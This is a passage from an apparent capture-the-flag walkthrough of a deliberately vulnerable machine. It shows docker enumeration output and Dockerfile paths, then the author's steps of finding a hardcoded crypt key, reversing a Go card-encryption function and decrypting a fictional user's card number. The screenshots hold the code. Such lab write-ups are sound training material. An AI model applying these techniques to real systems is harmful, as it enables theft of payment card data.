34a690ba9b02        ap/card-server      "/bin/ls -lsa"           2 years ago         Exited (0) 2 years ago                                           trusting_wilson
3d318360a0fa        ap/card-server      "/bin/pwd"               2 years ago         Exited (0) 2 years ago                                           compassionate_bose
8e58db78547d        ap/card-server      "/bin/ps"                2 years ago         Exited (0) 2 years ago                                           romantic_liskov
020c54fe6669        ap/card-server      "/bin/bash ps"           2 years ago         Exited (126) 2 years ago                                         big_snyder
aab1a9271dc4        ap/card-server      "/bin/echo 'Hello wor"   2 years ago         Exited (0) 2 years ago                                           distracted_hypatia
b51cdbb7eebd        ap/jenkins          "/root/dockerfiles/je"   5 years ago         Up About an hour           127.0.0.1:8080->8080/tcp, 50000/tcp   gigantic_bartik
6759b94c8e77        ap/card-server      "app -cryptkey 4e8f16"   5 years ago         Up About an hour           0.0.0.0:80->80/tcp                    card-server
8197577bd6ca        ap/dashboard        "/bin/sh -c app"         5 years ago         Up About an hour                                                 dashboard


[-] Anything juicy in the Dockerfile:
-rw-r--r--    3 root     root           617 May 14  2016 /var/lib/docker/overlay/3ff45e81153bb6fe72f6efa98902440d6720f2fa6e8eefceff982733323f27cb/root/go/src/bitbucket.org/tomsteele/2016ctf/jenkins-docker/Dockerfile
-rw-r--r--    3 root     root           121 May 14  2016 /var/lib/docker/overlay/3ff45e81153bb6fe72f6efa98902440d6720f2fa6e8eefceff982733323f27cb/root/go/src/bitbucket.org/tomsteele/2016ctf/card-server/Dockerfile
-rw-r--r--    4 root     root            32 May 13  2016 /var/lib/docker/overlay/3ff45e81153bb6fe72f6efa98902440d6720f2fa6e8eefceff982733323f27cb/root/go/src/app/Dockerfile
-rw-r--r--    4 root     root            32 May 13  2016 /var/lib/docker/overlay/0456ec1a5b44919634dea35397d8ee1b8d2d4acec71d96cbf51e6d2c1ceb0fdf/root/go/src/app/Dockerfile
-rw-r--r--    4 root     root            77 May 16  2016 /var/lib/docker/overlay/349a2b9f2efa76f092a0824cb9d5187f0a5f63ea0bd6d6da044057b434eb89b7/root/go/src/app/Dockerfile
-rw-r--r--    3 root     root          1490 May 16  2016 /var/lib/docker/overlay/349a2b9f2efa76f092a0824cb9d5187f0a5f63ea0bd6d6da044057b434eb89b7/root/go/src/golang.org/x/net/http2/Dockerfile
-rw-r--r--    4 root     root            77 May 16  2016 /var/lib/docker/overlay/fcfc3aedc4c0b547c55ac4bc83eba231d91d177d1731cbd2aeccab29d8389989/root/go/src/app/Dockerfile
-rw-r--r--    3 root     root          1490 May 16  2016 /var/lib/docker/overlay/fcfc3aedc4c0b547c55ac4bc83eba231d91d177d1731cbd2aeccab29d8389989/root/go/src/golang.org/x/net/http2/Dockerfile
-rw-r--r--    3 root     root           617 May 14  2016 /var/lib/docker/overlay/700ce728e75082c9727baacee1fef4d6c74eb5d9096711ec61e131b61a5d381f/root/go/src/bitbucket.org/tomsteele/2016ctf/jenkins-docker/Dockerfile
-rw-r--r--    3 root     root           121 May 14  2016 /var/lib/docker/overlay/700ce728e75082c9727baacee1fef4d6c74eb5d9096711ec61e131b61a5d381f/root/go/src/bitbucket.org/tomsteele/2016ctf/card-server/Dockerfile
-rw-r--r--    4 root     root            32 May 13  2016 /var/lib/docker/overlay/700ce728e75082c9727baacee1fef4d6c74eb5d9096711ec61e131b61a5d381f/root/go/src/app/Dockerfile
-rw-r--r--    3 root     root           617 May 14  2016 /var/lib/docker/overlay/8197577bd6ca250c2a275f4c9457b64af8cdd6c60ae1af15c35df5de13d6b72d/merged/go/src/bitbucket.org/tomsteele/2016ctf/jenkins-docker/Dockerfile
-rw-r--r--    3 root     root           121 May 14  2016 /var/lib/docker/overlay/8197577bd6ca250c2a275f4c9457b64af8cdd6c60ae1af15c35df5de13d6b72d/merged/go/src/bitbucket.org/tomsteele/2016ctf/card-server/Dockerfile
-rw-r--r--    4 root     root            32 May 13  2016 /var/lib/docker/overlay/8197577bd6ca250c2a275f4c9457b64af8cdd6c60ae1af15c35df5de13d6b72d/merged/go/src/app/Dockerfile
-rw-r--r--    4 root     root            77 May 16  2016 /var/lib/docker/overlay/dbbf1c349da34054d63c8b45e9088ba9d631cc8cbeedd9c8821c4437fe8b7255/root/go/src/app/Dockerfile
-rw-r--r--    3 root     root          1490 May 16  2016 /var/lib/docker/overlay/dbbf1c349da34054d63c8b45e9088ba9d631cc8cbeedd9c8821c4437fe8b7255/root/go/src/golang.org/x/net/http2/Dockerfile
-rw-r--r--    4 root     root            77 May 16  2016 /var/lib/docker/overlay/06a93774b86970b8d106f043422df52058e795c256b26a9932f8d77141c1149d/root/go/src/app/Dockerfile
-rw-r--r--    3 root     root           617 May 14  2016 /var/lib/docker/overlay/a933af7196bd88155f2298a217ab28d284a2c1e7938cc4a3ab07eecb72db9736/root/go/src/bitbucket.org/tomsteele/2016ctf/jenkins-docker/Dockerfile
-rw-r--r--    3 root     root           121 May 14  2016 /var/lib/docker/overlay/a933af7196bd88155f2298a217ab28d284a2c1e7938cc4a3ab07eecb72db9736/root/go/src/bitbucket.org/tomsteele/2016ctf/card-server/Dockerfile
-rw-r--r--    4 root     root            32 May 13  2016 /var/lib/docker/overlay/a933af7196bd88155f2298a217ab28d284a2c1e7938cc4a3ab07eecb72db9736/root/go/src/app/Dockerfile
-rw-r--r--    4 root     root            77 May 16  2016 /var/lib/docker/overlay/6759b94c8e77235b9b4ff71a54fa1d6ff1000dd6a2baa57f4c08ec79d8b0c41c/merged/go/src/app/Dockerfile
-rw-r--r--    3 root     root          1490 May 16  2016 /var/lib/docker/overlay/6759b94c8e77235b9b4ff71a54fa1d6ff1000dd6a2baa57f4c08ec79d8b0c41c/merged/go/src/golang.org/x/net/http2/Dockerfile
-rw-r--r--    1 root     root           617 May 12  2016 /root/dockerfiles/jenkins/Dockerfile

### SCAN COMPLETE ####################################


```

14. the most valuable information I had found were:
- ``` app -cryptkey 4e8f1670f502a3d40717709e5f80d67c ```
- I am in a docker, Honey! There is another escape I had to do. wait! nope, I find another paths I could access such as:``` /var/lib/docker/overlay/3ff45e81153bb6fe72f6efa98902440d6720f2fa6e8eefceff982733323f27cb/root/go/src/bitbucket.org/tomsteele/2016ctf/card-server/Dockerfile ```

15. Guess what I find a script is written in Golang responsible to encrypt the PAN and I find hardcoded PAN inside it too.
![PAN and encryption function](https://github.com/bassammaged/Random-machines/blob/main/images/credit-cards-encrypted-ccn.png) 


I want to warn Mr. Scott, You are now under my radar, HaHaHaHa!!!

<p align="center">
  <img src="https://media2.giphy.com/media/9umH7yTO8gLYY/giphy.gif">
</p>

Let's get back to the machine again :D.
 
 16. I reserved the encrypt function and build up my own decrypt function as the following:

![encryption function](https://github.com/bassammaged/Random-machines/blob/main/images/encrypt-function.png) 
![decryption function](https://github.com/bassammaged/Random-machines/blob/main/images/decrypt-function.png) 

I suceeded to encrypt a random plain text and get it back to plain text again :D.

 17. Mr. Scott! You have to run :D I decrypted his PAN card.
![decryption function](https://github.com/bassammaged/Random-machines/blob/main/images/decrypt-scott-ccn.png) 

<p align="center">
  <img src="https://media1.tenor.com/images/ca7430d955f70ba46c300ca5c04aaaa4/tenor.gif">
</p>

<p align="center">
  
  
```
I hope it was a good scenario for you, Thanks for your valuable time.
See you later in another challenge.
Written by kemet.
```
  
  
</p>


